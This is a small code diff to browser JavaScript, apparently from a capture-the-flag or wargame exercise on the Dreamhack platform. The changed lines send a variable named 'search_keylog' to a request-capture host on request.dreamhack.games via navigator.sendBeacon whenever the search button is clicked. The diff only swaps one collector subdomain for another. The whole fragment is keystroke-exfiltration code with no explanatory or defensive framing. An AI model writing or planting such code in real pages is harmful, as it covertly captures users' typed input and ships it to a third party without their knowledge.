@@ -9,5 +9,5 @@ search_word.addEventListener("input", e => {
 const search_btn = document.getElementsByTagName("button")[0];
 
 search_btn.addEventListener("click", () => {
-    navigator.sendBeacon("https://ygmbyfb.request.dreamhack.games",search_keylog);
+    navigator.sendBeacon("https://xcewdkz.request.dreamhack.games",search_keylog);
 });
